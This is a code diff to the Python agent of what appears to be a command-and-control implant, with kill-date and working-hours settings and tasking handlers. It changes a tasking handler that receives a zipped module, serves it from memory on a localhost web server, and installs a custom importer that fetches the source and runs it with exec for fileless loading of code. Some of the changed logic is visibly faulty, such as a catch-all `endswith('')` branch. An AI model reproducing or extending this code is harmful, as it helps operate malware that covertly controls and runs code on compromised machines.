@@ -1,4 +1,5 @@
 import __future__
+#from __future__ import unicode_literals
 import zipfile
 import io
 from HTMLParser import HTMLParser
@@ -37,8 +38,11 @@ missedCheckins = 0
 jobMessageBuffer = ""
 # killDate form -> "MO/DAY/YEAR"
 killDate = "" 
+_installed_meta_cache = { }
 # workingHours form -> "9:00-17:00"
 workingHours = ""
+meta_path = ""
+t = ""
 parts = profile.split("|")
 taskURIs = parts[0].split(",")
 userAgent = parts[1]
@@ -403,7 +407,14 @@ def processPacket(taskingID, data):
         pass
 
     elif taskingID == 122:
-            
+        
+        try:
+            t.kill()
+            if meta_path:
+                remove_meta(meta_path)
+        except:
+            pass
+
         try:
             #base64 and decompress the data. Then encode it again?
             parts = data.split('|')
@@ -421,11 +432,11 @@ def processPacket(taskingID, data):
         port = random.randrange(1025,65535)
         print "Started webserver"
         #dec_data = base64.b64encode(dec_data)
-        start_modulewebserver(dec_data, '127.0.0.1', port, 0)
+        start_modulewebserver(dec_data['data'], '127.0.0.1', port)
         meta_path = "http://127.0.0.1:"+str(port)
         print "Installing meta path"
         install_meta(meta_path)
-        sendMessage(encodePacket(122, "Import of %s successful" %(fileName) ))
+        sendMessage(encodePacket(122, "import of %s successful" %(fileName) ))
 
     else:
         return encodePacket(0, "invalid tasking ID: %s" %(taskingID))
@@ -508,11 +519,16 @@ class UrlModuleLoader(object):
         mod = sys.modules.setdefault(fullname, imp.new_module(fullname))
         mod.__file__ = self.get_filename(fullname)
         mod.__loader__ = self
-        mod.__package__ = fullname.rpartition('.')[0]
+        if fullname == fullname.split('.')[0]:
+            mod.__package__ = fullname.rpartition('.')[2]
+        else:
+            mod.__package__ = fullname.rpartition('.')[0]
+        print "Loading module with exec call"
         exec(code, mod.__dict__)
         return mod
 
     def get_code(self, fullname):
+        print "Obtaining source code for module"
         src = self.get_source(fullname)
         return compile(src, self.get_filename(fullname), 'exec')
 
@@ -528,7 +544,7 @@ class UrlModuleLoader(object):
             return self._source_cache[filename]
         try:
             u = urlopen(filename)
-            source = u.read().decode('utf-8')
+            source = u.read().decode('ascii')
             self._source_cache[filename] = source
             return source
         except e:
@@ -550,7 +566,7 @@ class UrlPackageLoader(UrlModuleLoader):
     def is_package(self, fullname):
         return True
 
-_installed_meta_cache = { }
+
 def install_meta(address):
     print "Installed meta_finder"
     if address not in _installed_meta_cache:
@@ -793,9 +809,9 @@ def start_webserver(data, ip, port, serveCount):
     t.start()
     return
 
-def start_modulewebserver(data, ip, port, serveCount):
+def start_modulewebserver(data, ip, port):
     # thread modulewebserver for execution
-    t = threading.Thread(target=module_webserver, args=(data, ip, port, serveCount))
+    t = KThread(target=module_webserver, args=(data, ip, port))
     t.start()
     return
 
@@ -827,23 +843,19 @@ def data_webserver(data, ip, port, serveCount):
     return
 
 
-def module_webserver(data, ip, port, serveCount):
+def module_webserver(data, ip, port):
     #host a python module on a webserver for the Custom web importer
     print "In module_webserver"
     hostName = str(ip)
     portNumber = int(port)
     zf = zipfile.ZipFile(io.BytesIO(data), "r")
     paths = zf.namelist()
-    serveCount = len(paths) * 2
-    count = 0
-    #basically re-implement the simpleHTTServer class to serve an in memory zip :(
     class serverHandler(BaseHTTPServer.BaseHTTPRequestHandler):
         def do_GET(self):
             """Respond to a GET request"""
-            print "Got a request"
             response = ""
             filesDirs = []
-            mimetype = 'text/html; charset=UTF-8'
+            mimetype = 'text/html'
             trimPath = self.path.lstrip('/')
             if self.path == '/':
                 #show all available directories and files at the root path 
@@ -851,15 +863,16 @@ def module_webserver(data, ip, port, serveCount):
                     if os.path.splitext(content.split(self.path)[0])[-1] != '':
                         filesDirs.append(content.split(self.path)[0])
                     else:
-                        filesDirs.append(content.split(self.path)[0])
+                        filesDirs.append(content.split(self.path)[0]+"/")
                     #remove dups
                 filesDirs = list(set(filesDirs))
                 for path in filesDirs:
                     response += "<li><a href='%s'>%s</a>\r\n" % (path,path)
+                print "%s 200" % self.requestline
                 self.send_response(200)
                 self.send_header('Content-type', mimetype)
                 self.end_headers()
-                self.wfile.write(response)
+                self.wfile.write(response.decode('ascii'))
             elif self.path.endswith('/'):
                 for content in paths:
                     if content == content.split(trimPath)[0]:
@@ -871,40 +884,57 @@ def module_webserver(data, ip, port, serveCount):
                 if len(filesDirs) != 0:
                     for path in filesDirs:
                         response += "<li><a href='%s'>%s</a>\r\n" % (path,path)
+                    print "%s 200" % self.requestline
                     self.send_response(200)
                     self.send_header('Content-type', mimetype)
                     self.end_headers()
-                    self.wfile.write(response)
+                    self.wfile.write(response.decode('ascii'))
                 else:
+                    print "%s 404" % self.requestline
                     self.send_response(404)
-                    self.send_header('Content-type', 'text/html; charset=UTF-8')
+                    self.send_header('Content-type', 'text/plain')
                     self.end_headers()
                     self.wfile.write("file not found")
-            else:
+            elif self.path.endswith('.py'):
+                print "%s 200" % self.requestline
                 try:
                     response = zf.open(trimPath, 'r').read()
                     self.send_response(200)
-                    self.send_header('Content-type', 'text/plain; charset=UTF-8')
+                    self.send_header('Content-type', 'text/plain')
                     self.end_headers()
-                    self.wfile.write(response)
+                    self.wfile.write(response.decode('ascii'))
                 except:
+                    print "%s 404" % self.requestline
                     self.send_response(404)
-                    self.send_header('Content-type', mimetype)
+                    self.send_header('Content-type', 'text/plain')
                     self.end_headers()
                     self.wfile.write('file not found')
-                
+            elif self.path.endswith(''):
+                print "%s 301" % self.requestline
+                self.send_response(301)
+                self.send_header("Location", "http://%s:%s%s/" % (hostName,port,self.path))
+                self.end_headers()
+            else:
+                try:
+                    response = zf.open(trimPath, 'r').read()
+                    print "%s 200" % self.requestline
+                    self.send_response(200)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write(response.decode('ascii'))
+                except:
+                    print "%s 404" % self.requestline
+                    self.send_response(404)
+                    self.send_header('Content-type', 'text/plain')
+                    self.end_headers()
+                    self.wfile.write('file not found') 
 
         def log_message(s, format, *args):
             return
+
     server_class = BaseHTTPServer.HTTPServer
     httpServer = server_class((hostName,portNumber), serverHandler)
-    try:
-        while (count < serveCount):
-            httpServer.handle_request()
-            count += 1
-    except:
-        pass
-    httpServer.server_close()
+    httpServer.serve_forever()
 
 # additional implementation methods
 def run_command(command):
